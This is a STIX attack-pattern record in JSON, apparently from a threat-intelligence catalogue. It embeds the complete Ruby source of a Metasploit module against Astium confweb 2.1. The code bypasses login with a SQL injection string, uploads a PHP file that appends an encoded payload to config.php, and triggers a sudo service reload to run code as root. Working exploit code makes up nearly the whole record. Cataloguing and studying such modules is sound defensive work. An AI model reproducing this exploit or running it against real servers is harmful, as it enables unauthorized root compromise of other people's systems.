{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1fb8d50b-eac0-48f0-bffd-3133b2ef78ea",
    "created": "2024-08-14T17:01:46.608079Z",
    "modified": "2024-08-14T17:01:46.608084Z",
    "name": "\"Astium Remote Code Execution\"",
    "description": " This module exploits vulnerabilities found in Astium astium-confweb-2.1-25399 RPM and lower. A SQL Injection vulnerability is used to achieve authentication bypass and gain admin access. From an admin session arbitrary PHP code upload is possible. It is used to add the final PHP payload to \"/usr/local/astium/web/php/config.php\" and execute the \"sudo /sbin/service astcfgd reload\" command to reload the configuration and achieve remote root code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/astium_sqli_upload.rb",
            "external_id": "astium_sqli_upload.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking # Configuration is overwritten and service reloaded\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Astium Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits vulnerabilities found in Astium astium-confweb-2.1-25399 RPM and\n        lower. A SQL Injection vulnerability is used to achieve authentication bypass and gain\n        admin access. From an admin session arbitrary PHP code upload is possible. It is used\n        to add the final PHP payload to \"/usr/local/astium/web/php/config.php\" and execute the\n        \"sudo /sbin/service astcfgd reload\" command to reload the configuration and achieve\n        remote root code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'xistence <xistence[at]0x90.nl>' # Discovery, Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '88860' ],\n          [ 'EDB', '23831' ]\n        ],\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['Astium 2.1', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2013-09-17',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to the Astium installation', '/']),\n        ])\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    # Check version\n    vprint_status(\"Trying to detect Astium\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"en\", \"content\", \"index.php\")\n    })\n\n    if res and res.code == 302 and res.body =~ /direct entry from outside/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def exploit\n    print_status(\"Access login page\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri),\n      'vars_get' => {\n        'js' => '0',\n        'ctest' => '1',\n        'origlink' => '/en/content/index.php'\n      }\n    })\n\n    if res and res.code == 302 and res.get_cookies =~ /astiumnls=([a-zA-Z0-9]+)/\n      session = $1\n      print_good(\"Session cookie is [ #{session} ]\")\n      redirect =  URI(res.headers['Location'])\n      print_status(\"Location is [ #{redirect} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Access to login page failed!\")\n    end\n\n\n    # Follow redirection process\n    print_status(\"Following redirection\")\n    res = send_request_cgi({\n      'uri' => \"#{redirect}\",\n      'method' => 'GET',\n      'cookie' => \"astiumnls=#{session}\"\n    })\n\n    if not res or res.code != 200\n      fail_with(Failure::Unknown, \"#{peer} - Redirect failed!\")\n    end\n\n\n    sqlirandom = rand_text_numeric(8)\n\n    # SQLi to bypass authentication\n    sqli=\"system' OR '#{sqlirandom}'='#{sqlirandom}\"\n\n    # Random password\n    pass = rand_text_alphanumeric(10)\n\n    post_data = \"__act=submit&user_name=#{sqli}&pass_word=#{pass}&submit=Login\"\n    print_status(\"Using SQLi to bypass authentication\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"/en\", \"logon.php\"),\n      'cookie' => \"astiumnls=#{session}\",\n      'data'   => post_data\n    })\n\n    if not res or res.code != 302\n      fail_with(Failure::Unknown, \"#{peer} - Login bypass was not succesful!\")\n    end\n\n    # Random filename\n    payload_name = rand_text_alpha(rand(10) + 5) + '.php'\n\n    phppayload = \"<?php \"\n    # Make backup of the \"/usr/local/astium/web/php/config.php\" file\n    phppayload << \"$orig = file_get_contents('/usr/local/astium/web/php/config.php');\"\n    # Add the payload to the end of \"/usr/local/astium/web/php/config.php\". Also do a check if we are root,\n    # else during the config reload it might happen that an extra shell is spawned as the apache user.\n    phppayload << \"$replacement = base64_decode(\\\"#{Rex::Text.encode_base64(payload.encoded)}\\\");\"\n    phppayload << \"$f = fopen('/usr/local/astium/web/php/config.php', 'w');\"\n    phppayload << \"fwrite($f, $orig . \\\"<?php if (posix_getuid() == 0) {\\\" . $replacement . \\\"} ?>\\\");\"\n    phppayload << \"fclose($f);\"\n    # Reload astcfgd using sudo (so it will read our payload with root privileges).\n    phppayload << \"system('sudo /sbin/service astcfgd reload');\"\n    # Sleep 1 minute, so that we have enough time for the reload to trigger our payload\n    phppayload << \"sleep(60);\"\n    # Restore our original config.php, else the Astium web interface won't work anymore.\n    phppayload << \"$f = fopen('/usr/local/astium/web/php/config.php', 'w');\"\n    phppayload << \"fwrite($f, $orig);\"\n    phppayload << \"fclose($f);\"\n    phppayload << \"?>\"\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"submit\", nil, nil, \"form-data; name=\\\"__act\\\"\")\n    post_data.add_part(phppayload, \"application/octet-stream\", nil, \"file; name=\\\"importcompany\\\"; filename=\\\"#{payload_name}\\\"\")\n    file = post_data.to_s\n\n    print_status(\"Uploading Payload [ #{payload_name} ]\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"en\", \"database\", \"import.php\"),\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => \"astiumnls=#{session}\",\n      'data'   => file\n    })\n\n    # If the server returns 200 and the body contains our payload name,\n    # we assume we uploaded the malicious file successfully\n    if not res or res.code != 200 or res.body !~ /#{payload_name}/\n      fail_with(Failure::Unknown, \"#{peer} - File wasn't uploaded, aborting!\")\n    end\n\n    register_file_for_cleanup(\"/usr/local/astium/web/html/upload/#{payload_name}\")\n\n    print_status(\"Requesting Payload [ #{uri}upload/#{payload_name} ]\")\n    print_status(\"Waiting as the reloading process may take some time, this may take a couple of minutes\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"upload\", \"#{payload_name}\")\n    }, 120)\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.\n    if res and res.code != 200\n      print_error(\"Unexpected response...\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-17",
    "x_mitre_platforms": [
        "['php']"
    ]
}